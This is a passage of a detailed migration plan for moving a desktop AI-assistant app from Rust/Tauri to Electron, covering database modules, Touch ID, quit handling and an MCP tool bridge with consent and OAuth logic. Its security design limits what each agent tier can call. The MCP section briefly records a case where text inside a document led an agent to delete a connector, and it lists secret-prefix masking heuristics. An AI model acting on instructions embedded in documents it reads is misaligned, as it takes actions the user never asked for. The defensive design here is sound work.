- Scratch dirs are uuid-named and Drop-cleaned — pid-named dirs made recycled pids fail the NEXT run with a misleading 'file already exists'

**Native/Tauri surface:** none (pure lib + fs)

### `src-tauri/src/db/memories.rs` — 274 LOC → electron-main (0.5 d)

Memories CRUD with S9 soft-delete (same trash shape as files — delete_memory was the app's one irreversible AI action), category column (preference|fact|project|instruction|NULL), literal-LIKE search.

**Replacement:** TS port; reuses the shared TrashActor and like-escape helpers.

**Must preserve:**
- Soft-delete with actor attribution, restore path; listings filter trashed_at IS NULL
- Search terms taken literally (escaped LIKE) to match files/messages rules

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/web_cache.rs` — 261 LOC → electron-main (0.5 d)

Web caches: web_searches (15-min TTL, normalized-query key, JSON hits serving both the model's text list and the browser results page), web_pages (24h TTL, URL-unique upsert), web_images (guard-fetched preview bytes for data-URL rendering), prune/count/clear.

**Replacement:** TS port; TTLs expressed with the same SQLite datetime arithmetic.

**Must preserve:**
- EMPTY search results are never cached — offline produces 'no hits' and caching it made 15 minutes of retries confirm 'nothing exists' after the connection returned
- One cache row serves model and browser (address-bar search makes the assistant's next web_search a free hit)

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/folders.rs` — 218 LOC → electron-main (0.5 d)

One flat level of folders: list/create/rename/delete (files fall back to top level), move_file_to_folder; UNIQUE name clashes reported in user words via execute_unique.

**Replacement:** TS port; map SQLITE_CONSTRAINT_UNIQUE to the friendly message.

**Must preserve:**
- Delete un-files (folder_id=NULL), never deletes files
- Name clash surfaces as 'A folder named X already exists', not SQLite's table/column leak

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/biometrics.rs` — 218 LOC → electron-builtin (2 d)

Touch ID unlock: the room password stored as a Keychain generic password (service 'PrivateRoom', account = room path) in the data-protection keychain under SecAccessControl biometryCurrentSet (this-device-only); has() probes attributes-only with auth UI skipped so it never prompts; read() forces the biometric prompt; OSStatus→friendly-message mapping that always names the password fallback.

**Replacement:** Electron built-ins: systemPreferences.promptTouchID('unlock <room>') as the gate, then decrypt a per-room secret sealed with safeStorage (Keychain-backed) from app data. Weaker than SecAccessControl: the OS no longer hardware-binds the read to the biometric match, and re-enrolling a finger no longer auto-invalidates the item — document the trade or emulate invalidation by storing the enrollment state.

**Must preserve:**
- has() must NEVER trigger a prompt (called the moment the unlock screen appears): attributes-only query with kSecUseAuthenticationUISkip; present-but-locked (errSecInteractionNotAllowed) still counts as exists
- Every unavailable-Keychain message names the password fallback — a bare status code on the unlock screen reads as 'the room is gone'
- store() deletes-then-creates (never the authenticated update path on a biometric item); this-device-only, never syncs
- delete() is idempotent (missing = success)
- Re-enrolling a finger invalidates the item (biometryCurrentSet) — an intentional security property

**Gotchas:**
- promptTouchID resolves/rejects but does NOT gate any secret — a compromised renderer could skip the prompt; keep the secret in main only, behind the prompt in one function
- safeStorage on macOS keys off the app's Keychain identity: signing-identity changes invalidate all stored secrets (Arcelle keeps Keychain service name 'PrivateRoom' and the same signing key per rebrand memory — do not rotate)
- Cancel/no-match/no-entry map to gentle text (password field is on screen); keep the message contract, the unlock UI switches on it

**Native/Tauri surface:** Security.framework: SecItemCopyMatching, SecAccessControl (biometryCurrentSet), kSecUseDataProtectionKeychain, kSecUseAuthenticationUISkip; security-framework / core-foundation crates

### `src-tauri/src/db/util.rs` — 213 LOC → electron-main (0.5 d)

Query/execute plumbing shared by every table module: query_rows/query_one/query_opt, execute_one (row count ignored), execute_existing (0 rows = caller's error message — the anti-'Saved a deleted row' guard), execute_unique (UNIQUE clash in caller's words).

**Replacement:** Thin TS helpers over better-sqlite3 (stmt.all/get/run; run().changes drives executeExisting). Error-message parity matters less than the missing-vs-broken distinction.

**Must preserve:**
- execute_existing exists because UPDATE-of-deleted-row returns Ok with 0 changes — anything whose success claim depends on the row existing must use it
- execute_unique matches on the word UNIQUE — only safe on tables with a single unique constraint besides the uuid PK (documented in its own test)

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/commands/window_geometry.rs` — 199 LOC → electron-main (0.5 d)

Window position/size persistence per-Mac (app data window.json, never inside a room): note_geometry on move/resize (skipping fullscreen rectangles), save on quit, restore on launch ONLY if geometry_is_usable — ≥80px of title bar overlapping an attached screen, size ≥ the window's own 900×600 minimum — so a rectangle remembered on an unplugged monitor is never restored off-screen.

**Replacement:** TS in main: BrowserWindow getBounds/setBounds + screen.getAllDisplays; same JSON file in app.getPath('userData'); port geometry_is_usable verbatim (it is the whole point — the file explicitly rejects the window-state plugin because it restores unchecked). Skip isFullScreen rectangles.

**Must preserve:**
- Refusing to restore is always recoverable; restoring off-screen is not — the guard is the feature
- Only the TITLE BAR matters (a window hanging off the bottom/right is usable; nothing to grab is not); GRABBABLE=80px
- Fullscreen Resized events are not remembered (quitting from fullscreen would park a display-sized window and destroy the chosen arrangement)
- Write once on the way out, not per move event; restore seeds the cache so quitting without moving rewrites the same rectangle
- Best-effort everywhere: geometry failure must never fail a quit or a launch

**Gotchas:**
- Electron bounds are DIP, tao's were physical pixels — the saved window.json is not unit-compatible across the rewrite; version the file or discard old ones (a stale physical-pixel rectangle on a 2x display restores at half size, which the MIN_W guard would then silently reject — acceptable, but decide)

**Native/Tauri surface:** tauri::Window outer_position/inner_size/set_size/set_position/available_monitors/is_fullscreen; app_data_dir

### `src-tauri/src/db/browse.rs` — 194 LOC → electron-main (0.5 d)

Private-browser audit journal: append (trimmed to JOURNAL_CAP=5000 on write), list newest-first, clear, and browse_clear_scope counts. The inversion: the WEB persists nothing (non-persistent webview), everything the AGENT did persists here, encrypted.

**Replacement:** TS port, three prepared statements. The session (sitting) column semantics carry over unchanged.

**Must preserve:**
- Cap enforced on write (one cheap DELETE per append) — no unbounded audit log
- session='' means 'written outside a sitting' including every pre-column row

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/chats.rs` — 170 LOC → electron-main (0.5 d)

Chat CRUD: list ordered by last MESSAGE stamp (not chat creation — unlock restores the first row so ordering decides where the user lands), create/delete/rename, set_chat_title_if_new.

**Replacement:** TS port; the COALESCE(last message stamp, own created_at) ordering query ports as-is.

**Must preserve:**
- Newest CONVERSATION first — ordering by created_at put yesterday's abandoned chat above the one used all morning, and unlock landed the user in it

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/commands/shell_exit.rs` — 151 LOC → electron-main (0.5 d)

The ⌘Q door: macOS menu Quit calls NSApplication terminate:, which tao only surfaces as RunEvent::ExitRequested (never a window close), so the JS unsaved-edits guard was bypassed and Monaco buffers died silently. Shape: hold the exit once (fail-open latch — a second ⌘Q always quits), ask the window via the 'quit-requested' event, frontend pushes set_unsaved_edits/quit_guard_rearm.

**Replacement:** Electron's before-quit fires for ⌘Q/Dock/menu quit and supports preventDefault — the whole reason this module exists disappears. Keep the same protocol: main holds unsavedEdits+quitHeld booleans (ipcMain from renderer), before-quit preventDefaults once when dirty and sends 'quit-requested'; renderer answers with app.quit() or rearm. ~40 lines.

**Must preserve:**
- Fail-open: a wedged window must never trap the user — the second ⌘Q quits regardless (the latch)
- Cancel re-arms the latch (Cancel means 'not this time', not 'never again'); saving clears the dirty flag which also re-arms
- A programmatic exit carrying a code is never re-asked (the dialog's own quit path would raise the dialog forever)
- State is pushed from the frontend (only Monaco knows) because the exit handler is synchronous and cannot ask

**Gotchas:**
- Per QA memory: tao has no applicationShouldTerminate: so ExitRequested never fired for macOS Quit and the app menu had to own ⌘Q — in Electron before-quit genuinely fires, so delete the menu workaround rather than porting it
- Distinguish user-quit from programmatic quit: use a module flag set before calling app.quit() from the answered path (Electron has no exit code on before-quit)

**Native/Tauri surface:** tauri RunEvent::ExitRequested (wired in lib.rs); tao/NSApplication terminate: semantics

### `src-tauri/tests/roomai_cli.rs` — 106 LOC → electron-main (0.5 d)

End-to-end test of the roomai CLI binary (CARGO_BIN_EXE_roomai): verify/info with ROOMAI_PASSWORD, wrong password → non-zero with nothing leaked, recover with ROOMAI_RECOVERY code, export writes stored files back out byte-identical.

**Replacement:** The CLI itself must be re-implemented as a small Node script (bin/roomai.ts over the same db layer, read-only opens for verify/info); test via child_process.execFile in vitest with the same env-var contract. Note: the CLI binary source is outside this group — coordinate with whoever owns src-tauri/src/bin/, but this test defines its contract.

**Must preserve:**
- Password/recovery code arrive via env vars, never argv (visible in ps)
- verify/info promise read-only (open_room_readonly exists for them)
- Wrong password: non-zero exit, nothing on stdout

**Native/Tauri surface:** none (subprocess of the built binary)

### `src-tauri/src/db/meta.rs` — 41 LOC → electron-main (0.1 d)

meta table get/set (format, format_version, room name, embedding model stamps). UPSERT semantics.

**Replacement:** Two prepared statements in TS.

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/settings.rs` — 17 LOC → electron-main (0.1 d)

Room-scoped settings key/value get/set (UPSERT).

**Replacement:** Two prepared statements in TS.

**Native/Tauri surface:** rusqlite only

**Subsystem risks:**
- SQLCipher compatibility is the make-or-break: better-sqlite3-multiple-ciphers must open real field .room files with cipher='sqlcipher' legacy=4 (PBKDF2-SHA512/256k, HMAC-SHA512) INCLUDING files that have been re-keyed and checkpoint .roomck copies; prove it on actual user rooms in week 1, and keep the one-time VACUUM-INTO converter as the sanctioned fallback (owner allows it). Whatever lands, re-create the apply_key invariant: exactly ONE function keys AND pins, enforced by a lint/test — two of four Rust call sites once drifted.
- better-sqlite3 is synchronous: migrate() on old rooms, embedding-null repairs, VACUUM, and multi-GB VACUUM INTO checkpoints will freeze the Electron main thread and every window. The DB must live in a worker_threads/utilityProcess with an async RPC facade — but that reintroduces interleaving the Rust Mutex<Connection> prevented; every multi-statement invariant (trash chunk-move, staged-artifact commit, finalize_rec_audio) must execute as one synchronous transaction inside the worker, never as multiple round-trips.
- Teardown/rollback ordering is where silent data corruption lives: browser flushed and jobs parked BEFORE the handle drops, epoch bump against path-pinned stragglers, rollback's drain-and-refuse, busy-flag cleared on every exit path (Rust used a Drop guard; JS needs try/finally discipline). The Rust test suite encodes these orderings against a mock runtime — port those tests, not just the code, and remember the standing lesson that agent-written 'fixes' have shipped inert before (run the equivalent of `cargo check | grep 'never used'` on the TS port).
- Migration fidelity for old rooms: every guarded ALTER, both-places table minting (SCHEMA + migrate), user_version born-current stamping, and the three one-time repairs must port statement-for-statement; getting library_visibility defaults wrong empties every field room's Library with zero errors (the schema tests call this indistinguishable-from-data-loss). The include_str! structural guards (CURRENT_USER_VERSION lockstep, single keying site) need TS equivalents.
- Touch ID semantics weaken: Electron has no SecAccessControl/biometryCurrentSet, so promptTouchID + safeStorage means the secret is no longer hardware-gated to the enrolled biometric set and re-enrollment no longer invalidates it; also safeStorage invalidates on signing-identity change (keep the existing signing key and 'PrivateRoom' Keychain naming — rebrand memory says never rotate them). Owner should sign off on the reduced model explicitly.
- Blob memory and perf: 200MB recording versions, checkpoint payloads and original_bytes all become whole Buffers over IPC boundaries (Rust streamed within one process); budget for chunked reads or keep blob-heavy operations entirely inside the DB worker. The cosine full scan (for_each_chunk_embedding) moves from Rust to JS — fine at 20k chunks but measure, with sqlite-vec as the escape hatch.
- Cross-boundary data flows that didn't exist in the monolith: voiceprints (DB in Electron main) consumed by diarization (Python sidecar), rec_chunks PCM written by the audio pipeline (Python) but recovered at unlock (main), privacy entities read by the redaction seam — each needs an explicit IPC/HTTP contract or the invariants (voices never reach a model; recovery is transactional) quietly break.
- The plaintext sidecars (.recovery wrap, .checkpoints/manifest.json 0600) and the .roomck payloads are user-visible on-disk contracts: byte-compatible RecoveryWrap JSON, same paths, same temp-then-rename atomicity (fs.writeFile truncate-first is the exact bug the Rust code fixed), same 0600 mode on the manifest.
- Window-geometry file units change (tao physical px → Electron DIP): version window.json or old files restore wrong-sized windows; and delete the ⌘Q menu workaround rather than porting it — Electron's before-quit genuinely fires for macOS Quit, unlike tao.

## 6. MCP (client + room server)

MCP subsystem: (1) an outbound MCP CLIENT (mcp.rs) speaking both stdio JSON-RPC and streamable-HTTP to user-configured connectors; (2) the room's own MCP SERVER bridge (room_mcp.rs) — a loopback, bearer-token, scope-tiered HTTP endpoint that is THE tool surface for every engine (local Python sidecar, cloud CLI engines, consulted advisors, opted-in external agents) and the app's central security boundary; (3) the command/consent layer (mcp_cmds.rs) with SEC-1 per-Mac fingerprint approvals, per-call consent cards, per-connector auto-approve/unmask powers, per-tool opt-outs, and agent-facing connector CRUD with credential masking; (4) a full OAuth 2.1 client (mcp_oauth.rs) — RFC 9728/8414/7591/7636 discovery, dynamic registration, PKCE loopback flow, SSRF-guarded with DNS pinning, and a refresh state machine distinguishing rejected vs unreachable; (5) the connector marketplace (mcp_registry.rs) reading the official MCP registry behind an explicit opt-in, normalizing entries local-first and inlining icons in bounded SSRF-checked waves; (6) an e2e stdio-client test (tests/mcp_client.rs). Rewrite target: the client and much of the bridge transport map onto @modelcontextprotocol/sdk (TS) in Electron main; the consent/approval/scope/OAuth-state logic is bespoke and must be ported behavior-for-behavior. Total ~9,340 lines (roughly a third of it in-file unit tests that pin the invariants). 21 #[tauri::command] handlers become IPC handlers. Estimated ~23.5 senior-dev days.

### `src-tauri/src/room_mcp.rs` — 3096 LOC → electron-main (8 d)

The room MCP bridge (ADD-20): a token-guarded loopback streamable-HTTP MCP SERVER exposing the room's tool catalog to every engine. Owns ToolScope (CloudAdvisor/CloudEngine/LocalEngine/ExternalAgent) — the trust-tier boundary deciding which tools each client class sees; the search_mcp_tools/run_mcp_tool proxy pair over connector catalogs; per-request re-read of web-lane switches; run-cancel refusal BEFORE side effects; the tool_ran crash-safety flag; the bridge-lifetime web-search throttle; consult_advisor with a saturating per-turn cap and the no-recursion invariant; and cloud redaction (restore placeholders inbound, redact results outbound, drop pixels).

**Replacement:** TS in Electron main: a node:http server bound to 127.0.0.1 (or @modelcontextprotocol/sdk Server + StreamableHTTPServerTransport with an auth middleware), crypto.timingSafeEqual bearer check, 16MB body cap enforced on the Content-Length declaration, and a direct port of ToolScope, served_tools, the proxy tools, and tool_call dispatching into the rewritten exec_tool (also TS in main). Keep the shutdown watch semantics via AbortController fan-out to live sockets.

**Must preserve:**
- ToolScope IS the security boundary: CloudAdvisor gets file tools (+MCP only when its sub-option says so), never UI/job tools and never an AdvisorRuntime (that absence is what closes cloud recursion); CloudEngine (owner decision 2026-07-25) gets local-engine parity EXCEPT the screen tools; ExternalAgent gets job tools + local_generate + view_media_frame but never UI tools and never consult_advisor; only LocalEngine+CloudEngine get connector-management CRUD (which only writes DISABLED drafts)
- tools/call is refused when the tool is not in the SERVED catalog for this scope — a client fabricating a name cannot reach UI/job tools; a fabricated consult_advisor on a nested bridge fails because that bridge carries no runtime
- Stop lands BEFORE the side effect: run_cancel checked at dispatch; initialize/ping/tools/list stay served on a cancelled run (refusing tools/list reports an EMPTY CATALOG which the agent narrates as a wiring failure); a stop arriving mid-dispatch severs delivery of the response
- stop() severs LIVE keep-alive connections (every conn selects on the shutdown watch, `biased`), not just future accepts — a downgraded bridge must not keep serving its captured scope/token; stop_and_wait() awaits the accept loop so a fixed-port restart doesn't race EADDRINUSE
- Body cap (16MB) is enforced on the Content-Length DECLARATION before any body byte is read — the bearer check happens after head parse, so any local process could otherwise OOM the app without knowing the token; oversize → 413 + connection drop (framing untrustworthy past a refused body)
- Bearer compare is constant-time and length-independent (the Leash full-tier token is long-lived, so short-circuit == is a timing oracle)
- Proxy pair: connector catalogs are served as exactly TWO tools (search_mcp_tools ranked/truncated to 12 with 'showing N of M' told to the model; run_mcp_tool validated against live routes); run_mcp_tool is deliberately NOT destructiveHint:true — a blanket destructive label made non-interactive codex exec refuse every connector call; nested `arguments` given as a JSON string are REFUSED with the shape named (silently {} ran tools with defaults nobody could see)
- Web-lane switches are re-read PER REQUEST (external agents hold one connection for a whole session; flipping Settings must take effect) and intersected with the caller's narrowing
- tool_ran flag set BEFORE dispatch — the authoritative 'a tool ran' signal closing the sidecar-crash double-side-effect race (sidecar.rs reads it)
- Web-search throttle lives on the BRIDGE (Instant-based, 180s cooldown) because every non-LocalEngine scope gets a throwaway ToolEffects per call and the flag was otherwise dropped between calls, retrying a dead endpoint forever
- Cloud scopes (unless privacy_bypass): inbound arguments pass through redactor.restore_value (a search for '[Person A]' must find the real name), outbound text is redacted and images are DROPPED entirely (pixels can't be redacted); LocalEngine is exempt (the sidecar's chat seam redacts)
- consult_advisor cap uses saturating fetch_update, not fetch_add — AtomicU8 wrap let call #257 through after 256 refusals; effects.pending_images are DRAINED into MCP image blocks so pixels ride exactly one tool result
- Catalog + per-dispatch obs logging (tool names only, never arguments — arguments are room content); the empty-bridge incident (2026-07-30) is why the catalog is logged where the model cannot narrate over it
- Window lookup must be the crate::main_window equivalent, not get-webview-by-name — opening the private browser made every tool call fail 'main window is gone' for the session

**Gotchas:**
- This file depends on ~everything: exec_tool, tools_catalog, ui/job/workflow/script tool specs, mcp_routes, the redaction policy, ToolEffects, TurnId, obs — the rewrite order must land those TS modules first or stub them; it cannot be ported in isolation
- The SDK's StreamableHTTPServerTransport wants to own the HTTP layer; the body-cap-before-read, 401-before-405 ordering, and live-connection severing are custom — if you adopt the SDK transport you must reimplement these around it or keep the hand-rolled ~200-line HTTP server (recommended: keep it, it's small and its tests exist)
- mcp_config_json() output shape ({type:'http', url, headers.Authorization}) is parsed back by the app's OWN parse_config in tests — keep them consistent
- effects sink: tokio::Mutex guard held across the whole exec_tool await serialises concurrent bridge calls into one effects log — in TS this needs an explicit async mutex (a plain object write is not equivalent)
- ExternalAgent sets effects.vision_chat=true which also covers view_screenshot when the privacy door is off — a KNOWN OPEN DEFECT documented in-code; do not 'fix' it silently or claim it fixed
- ~1,265 lines of in-file tests (tier catalogs per scope, severing, framing, ct_eq, proxy search) are the spec — port them

**Native/Tauri surface:** tokio::net::TcpListener (loopback, fixed-port retry 5x50ms then ephemeral fallback with stable:false); tauri::AppHandle / Manager::state (AppState access); tauri::async_runtime::spawn (accept loop + per-connection tasks); tokio::sync::watch (shutdown fan-out)

### `src-tauri/src/commands/mcp_cmds.rs` — 2715 LOC → electron-main (6 d)

The MCP command/consent layer: room config CRUD (get/apply/enable/remove), SEC-1 fingerprint approval gate (per-Mac, outside the room file), the per-call consent card flow (mcp_call_approved / resolve_mcp_call / confirm_destructive), Mac-wide + per-connector auto-approve and outbound-unmask powers, per-tool opt-outs, connection lifecycle (start_mcp_connections with live-connection carry-over and OAuth refresh-before-dial), OAuth commands (authorize/status/sign_out with room-epoch pinning), and agent-facing connector CRUD with credential masking/restore.

**Replacement:** TS module in Electron main: 18 ipcMain.handle endpoints; approvals/flags as JSON files under app.getPath('userData'); consent cards via webContents.send('mcp-approve-request') + a pending-promise map resolved by the renderer's resolve_mcp_call IPC (180s timeout = decline); config and tool prefs in the room DB settings table; pure helpers (fingerprint = sha256 hex, resigned_servers, same_destination, set_server_disabled, merge_bearer/strip_bearer, redact_cli_args/restore_redacted_args, preview_args, mcp_gate) port 1:1 with their vitest tests.

**Must preserve:**
- SEC-1: the room's AUTHOR is the attacker. Approvals are SHA-256 fingerprints of the exact config text, stored per-Mac in mcp_approvals.json — any byte change invalidates; refresh_mcp and the approval dialog route through ONE pure gate (mcp_gate) so spawner and dialog can never disagree; NeedsApproval → spawn NOTHING
- An UNREADABLE stored config is NOT an empty one: it renders as a single Failed notice row ('connector setup' — a name no real connector can have) and enable/remove REFUSE with the same message (removing 'nothing' used to rewrite+approve the config and silently blank the list)
- Consent split (owner decision 2026-08-03): auto-approve ('run without asking') and outbound-unmask ('send real values') are SEPARATE powers, each Mac-wide with optional per-connector overrides (Option<bool>, None = inherit — an untouched connector must be indistinguishable from one set back to default); skips_consent_card takes ONLY auto_approve + session-remember, never unmask; timeout/closed window = decline, never a silent yes
- Flag files fail CLOSED: only an explicit `true` on disk turns a power on; writes are persisted BEFORE the live flag moves so a failed write leaves disk and RAM agreeing (for unmask this matters twice — a flipped-but-unwritten flag would leak real values all session on a setting nothing recorded)
- Connector permissions are keyed by NAME and must be forgotten when the connector goes (forget_connector_grants) — a later connector landing on the same name silently inherited 'run without asking' + real-values; likewise mcp_apply_config clears OAuth tokens for resigned_servers (dropped/retargeted entries) or the new endpoint receives the OLD provider's refreshed token
- start_mcp_connections: generation counter discards stale background connects; a Connected server whose config_key is unchanged is CARRIED OVER (not redialled); anything left in `previous` is dropped, which is what kills a removed server's child; after connect, config_key records what was ACTUALLY dialled (a renewed bearer differs from the handed-in config)
- Every connect of a remote connector first runs refreshed_oauth_config: silent token renewal, save token BEFORE the config merge (refresh often rotates the refresh token), and room-path+epoch pinning so a room swapped mid-refresh never receives another room's token; a REJECTED refresh persists refresh_rejected so the drawer's sign-in button becomes usable again; Unreachable leaves the sign-in alone
- mcp_oauth_authorize pins room path+epoch before the up-to-5-minute browser wait, RE-READS the config after (merging into the pre-wait snapshot reverted concurrent edits and once leaked room A's config+token into room B), emits mcp-oauth-url for a manual-open fallback, and approves the merged config's fingerprint (the sign-in is the user action)
- Agent CRUD: agent_read_mcp shows masked configs (secret FIELDS + CLI-arg heuristics: credential flag words, vendor prefixes sk-/ghp_/xoxb-/AKIA/eyJ-JWT, long opaque tokens); restore_redacted_args pairs placeholders back to stored values BY VALUE with a preceding-argument tie-break (models reorder args; index-pairing stored the literal '[redacted]' over a real key); a placeholder pairing with nothing REFUSES the save; agent saves always land DISABLED and never touch credentials — human approval in Connectors stays required
- Agent deletions go through confirm_destructive (a distinct card shape with a `confirm` sentence; the card IS the undo — audit #505: a document saying 'remove the github connector' set it off); standing consent never reaches this card; declined → the fixed DELETE_DECLINED sentence so the model reports refusal instead of inventing
- preview_args: consent card shows up to 2000 chars and MARKS truncation with 'Allowing sends ALL of it' — an unmarked slice let Allow approve material never on screen
- Per-tool opt-outs live in the room DB (they are room prefs, not consent), take effect next turn via mcp_routes re-read, no reconnect

**Gotchas:**
- Fingerprints hash the EXACT config text — the DB migration must carry the stored config string byte-identical or every room re-prompts for approval on first open (acceptable, but decide it; silent auto-approval is not acceptable)
- The set_mcp_connector_power lock is held across the file write on purpose (two concurrent edits must not each save a pre-other map) — in single-threaded Node main this collapses to a serialized async queue, but the persist-first-then-report-actual-state contract must survive
- resolve_mcp_call's pending map + oneshot maps to a Map<string, resolver>; make sure a timeout REMOVES the entry or a late renderer reply resolves a dead card
- shell.openExternal replaces the opener plugin; still emit the URL first for the manual-open/copy fallback
- ~850 lines of in-file tests (gate, powers, masking round-trips, resigned_servers, merge/strip bearer) are the spec — port them

**Native/Tauri surface:** tauri::command / State / AppHandle / Window; tauri::Manager::app_data_dir (approvals + flag files); Window/App emit: mcp-status, mcp-approve-request, mcp-oauth-url events; tauri_plugin_opener OpenerExt (system browser for OAuth); rusqlite via db::get_setting/set_setting (room DB settings); tokio::sync::oneshot + 180s timeout (consent pending map)

### `src-tauri/src/commands/mcp_oauth.rs` — 1313 LOC → electron-main (4 d)

OAuth 2.1 client for remote MCP connectors per the MCP authorization spec (2025-06-18): WWW-Authenticate → RFC 9728 protected-resource metadata → RFC 8414 auth-server metadata → RFC 7591 dynamic client registration → PKCE (RFC 7636) authorization-code flow through the system browser and a loopback redirect; token store (encrypted room DB settings under oauth:<server>), silent refresh with a Rejected-vs-Unreachable distinction and a persistent refresh_rejected flag; every connector-chosen URL is SSRF-guarded with DNS resolution + pinning and hand-computed redirect hops.

**Replacement:** TS in Electron main: node:crypto (randomBytes + sha256 base64url) for PKCE/state, node:http on 127.0.0.1:0 for the callback listener, shell.openExternal for the browser, undici with a custom dns-pinning Agent (port of web::resolve_public_addr) and redirects=manual re-checked per hop for all discovery/registration/token requests. The @modelcontextprotocol/sdk client-auth helper implements the same RFC chain but NOT the SSRF guard or the refresh state machine — use it at most for metadata parsing; the flow orchestration here is worth porting directly. Pure pieces (parse_www_authenticate, well_known_prm, auth_metadata_urls, merge_refreshed, parse_token_response, callback parsing, urldecode) port 1:1.

**Must preserve:**
- SSRF doctrine: every address the CONNECTOR chose (challenge URL, PRM doc, auth server, authorize/token/registration endpoints) passes the literal private-address check AND is DNS-resolved to a public address the client is then PINNED to; redirects are never followed by the HTTP client — each Location is computed, absolutized, and re-guarded (max 3 hops). The ONE exception is probe_www_authenticate against the user's own configured server URL (a local MCP server is legitimate)
- Discovery candidate ordering is load-bearing: RFC 9728 puts the resource PATH after the well-known segment (origin-only second); RFC 8414 INSERTS the segment before the issuer path (multi-tenant), with the OIDC appended form as fallback — 4 deduped candidates per issuer; every PRM candidate and every listed auth server is tried before failure, and only the FINAL failure is reported
- Scopes: ask only for what the RESOURCE published (scopes_supported in PRM), never the auth server's whole catalogue; no published scopes → send NO scope parameter (provider default beats the AS superset)
- TokenError::Rejected (any non-2xx from the token endpoint) vs Unreachable (transport/parse failure) is the load-bearing split: only a REJECTION sets refresh_rejected (persisted, cleared by a fresh sign-in) — retiring a sign-in over a flaky network pushes the user through the browser for a connector that still works; a 200 with no access_token is Rejected (merging it would write an empty Bearer over a working one)
- merge_refreshed: RFC 6749 §6 lets the server omit refresh_token (old stays valid) and never returns token_endpoint — both are folded forward so the NEXT refresh is self-contained (no re-discovery); needs_refresh = missing token or within 60s of expiry; expires_at 0 = unknown, never 'expired'
- Loopback callback: EVERY connection until the 300s deadline gets a look (browsers open speculative connections that closed the old single-accept and lost real sign-ins); only a request carrying `code` — or the provider's own `error`/`error_description`, surfaced verbatim — ends the wait; state mismatch = failure; per-connection 10s read timeout and 64KB cap; urldecode is byte-wise (re-slicing the &str on a malformed escape PANICKED the whole sign-in task)
- clear_tokens writes an empty value (reads back as None); token key is oauth:<server-name>; per-server isolation
- authorize() composes only tested primitives; no registration_endpoint → explicit 'requires manual client setup' error; client registers as public ('token_endpoint_auth_method':'none') with authorization_code+refresh_token grants

**Gotchas:**
- Node fetch/undici follow redirects and resolve DNS at connect time by default — a naive port silently reintroduces both SSRF holes this file exists to close; you need redirect:'manual' plus a custom Lookup/Agent that checks EVERY resolved address and pins the connection to the checked one
- The 'legacy token without refresh_rejected parses as renewable' back-compat is a test-pinned invariant — keep the field defaulting to false on deserialize
- The callback listener must keep serving noise (favicon, speculative GETs) without ending the wait; a bounded test (10s) exists precisely because a regression here hangs for the full 5 minutes
- Token store rides the room DB — the .room migration must carry oauth:* settings or every remote connector signs out on migration (decide and document either way)

**Native/Tauri surface:** tokio::net::TcpListener (ephemeral loopback callback server); reqwest use_rustls_tls + redirect(Policy::none()) + .resolve() pinning; rand + sha2 + base64 (PKCE/state); rusqlite via db::set_setting/get_setting (token store in the encrypted room DB)

### `src-tauri/src/mcp.rs` — 1146 LOC → electron-main (3 d)

Minimal MCP client, two transports: Stdio (child process, newline-delimited JSON-RPC) and Http (streamable HTTP POST, JSON or SSE reply, Mcp-Session-Id echo). Implements initialize + tools/list (paginated) + tools/call, config parsing of the de-facto Claude Desktop {mcpServers:{...}} format, result flattening with bounded image carrying, and the Manager/Server/Status state the UI reads.

**Replacement:** Use @modelcontextprotocol/sdk Client with StdioClientTransport (stderr:'pipe' to keep the stderr-tail error messages) and StreamableHTTPClientTransport. Keep as thin TS wrappers: parse_config, config_key, sanitize_tool_name, flatten_call_result (with its image count/size/MIME bounds), and auth_error_message port 1:1 as pure functions with vitest tests. Fix GUI PATH via the same `zsh -lc` probe (or fix-path npm) before spawning uvx/npx.

**Must preserve:**
- config_key() fingerprints ONE server's transport (sorted env/header pairs — HashMap order must not leak in) so a live connection is carried across a config apply; without it flipping one connector's switch restarted every other connector
- Claude Desktop config format accepted verbatim: bare `url` (no `type`) = remote; `command`+`url` together = remote (url wins); `disabled` accepted on either shape
- flatten_call_result: image blocks are CARRIED not dropped, bounded to 2 images / 4MB b64 / png-jpeg-webp MIMEs, and every refusal is SAID in text (never silent); embedded `resource` blocks with text ARE the answer; resource_link → its uri; isError → Err with the text; empty → '(no output)'
- Tool `annotations` are preserved from connector catalogs — without them non-interactive Codex rejects even read-only calls when the room bridge re-exports them
- stderr tail trimmed on char boundaries (raw byte slice panicked on non-ASCII logs, poisoning the mutex and hanging the connector on 'Connecting…' forever); tail is appended to 'Server exited:' errors
- Stdio request loop skips non-JSON stdout lines (servers log there), replies to server→client `ping` with a real pong and to other server requests with -32601 so well-behaved servers don't hang
- HTTP transport: 401/403 with a WWW-Authenticate header → 'sign in via Connect account' message; a bare 401 → 'bad/missing token' — the distinction was a real-world confusion fix
- PATH for stdio spawns = login-shell PATH + inherited + /opt/homebrew/bin + ~/.local/bin + ~/.cargo/bin, with the app's own downloaded-runtime cache dir PREPENDED so a provisioned uvx/npx wins over a broken system one
- CONNECT_TIMEOUT 60s (first connect may download the package via uvx/npx), CALL_TIMEOUT 90s (web fetches are legitimately slow); non-object tool arguments are normalized to {}

**Gotchas:**
- The rustls-vs-native-tls note translates: Node's fetch/undici negotiates h2 fine, but if you shell to Electron's net module verify h2 against api.githubcopilot.com/mcp early
- The SDK's StreamableHTTPClientTransport handles SSE/session-id, but you must still capture WWW-Authenticate off 401s for the sign-in-vs-bad-token message — the SDK's UnauthorizedError loses the header unless you pass a custom fetch
- config_key must include headers (a refreshed bearer MUST reconnect) but exclude `disabled` — get this wrong either way and connectors either never pick up new tokens or restart on every toggle
- The in-file unit tests (~265 lines) pin every one of these behaviors; port them, they are the spec

**Native/Tauri surface:** tokio::process::Command (kill_on_drop child spawn); std::process::Command zsh -lc (login-shell PATH probe, OnceLock-cached); reqwest with use_rustls_tls (macOS native-tls ALPN fails to negotiate h2 against hosted MCP servers)

### `src-tauri/src/commands/mcp_registry.rs` — 933 LOC → electron-main (2 d)

